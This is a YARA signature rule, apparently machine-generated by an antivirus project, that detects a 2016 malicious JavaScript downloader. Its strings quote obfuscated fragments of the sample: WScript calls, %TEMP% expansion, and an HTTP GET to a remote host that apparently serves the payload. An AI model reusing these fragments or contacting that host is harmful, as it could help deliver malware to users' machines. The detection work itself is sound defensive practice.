rule sig_20160428_af00769d22b8bf99ffc6767b9df205cf {
  meta:
    description = "datamaliciousorder - file 20160428_af00769d22b8bf99ffc6767b9df205cf.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e15e26f35aad8cc99aaac90d9bbd7f0dd722769ed562b784065a2076f654e0fb"

  strings:
    $s1  = "function ZpnVmqOkfRocVorYtrKfp() {return UngTufVrkBbeDeeMkaRvq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function FmpMufDesLajXlcGdoMya(QbsYobZejVbfUmjWbgMpm){UngTufVrkBbeDeeMkaRvq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function FmpMufDesLajXlcGdoMya(QbsYobZejVbfUmjWbgMpm){UngTufVrkBbeDeeMkaRvq[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function PqhXirPgvAmsZfoWbeUyu(VisRpiFjrAmmSvlGyyNgg, IzqFfbVhjUivSxzFffNpo){QiaDodFguVprJbpVjmJll = QiaDodFguVprJbpVjmJll * 1; " ascii
    $s5  = "return VisRpiFjrAmmSvlGyyNgg - IzqFfbVhjUivSxzFffNpo;};" fullword ascii
    $s6  = "CpvMkbAosHehHvnMciIuc[LpfMvbStdRahYkpJqpQub](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s7  = "var WbtSjaJjpYnvDtiHwqEwn = this[\"WScript\"];" fullword ascii
    $s8  = "function ZpnVmqOkfRocVorYtrKfp() {return UngTufVrkBbeDeeMkaRvq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "if (CpvMkbAosHehHvnMciIuc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function AwoTpxUdjFdcBjdWltWuy(){return NkcRojDecQyiZqgSthIgw + \"\";};" fullword ascii
    $s11 = "function PqhXirPgvAmsZfoWbeUyu(VisRpiFjrAmmSvlGyyNgg, IzqFfbVhjUivSxzFffNpo){QiaDodFguVprJbpVjmJll = QiaDodFguVprJbpVjmJll * 1; " ascii
    $s12 = "var UngTufVrkBbeDeeMkaRvq = function GabLeeQfsGbaRbhCaqOoo() {return WbtSjaJjpYnvDtiHwqEwn[JlxWdbVyoDkbAuuArqGlx](\"WScript\"+\"" ascii
    $s13 = "function UiaDieHwgMfmYokEjoQem() {return ((CsuSzsBfpHqxOlpYvoWms == true) && (CsuSzsBfpHqxOlpYvoWms == EygNgpIweFsrAuqFfyWip)) ?" ascii
    $s14 = "function UiaDieHwgMfmYokEjoQem() {return ((CsuSzsBfpHqxOlpYvoWms == true) && (CsuSzsBfpHqxOlpYvoWms == EygNgpIweFsrAuqFfyWip)) ?" ascii
    $s15 = "var UngTufVrkBbeDeeMkaRvq = function GabLeeQfsGbaRbhCaqOoo() {return WbtSjaJjpYnvDtiHwqEwn[JlxWdbVyoDkbAuuArqGlx](\"WScript\"+\"" ascii
    $s16 = "var CsuSzsBfpHqxOlpYvoWms = false;" fullword ascii
    $s17 = "var GjgVqzVmfWpdKduEcrSch = false;" fullword ascii
    $s18 = "function IykIleZcnUygUumChxLhx()" fullword ascii
    $s19 = "GjgVqzVmfWpdKduEcrSch = true;" fullword ascii
    $s20 = "return PqhXirPgvAmsZfoWbeUyu(1 == 1 ? UijFscFsxChiNjyWleGwt : 0, 1 == 1 ? LaeGgtLceLvwOtqSvlVsh : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}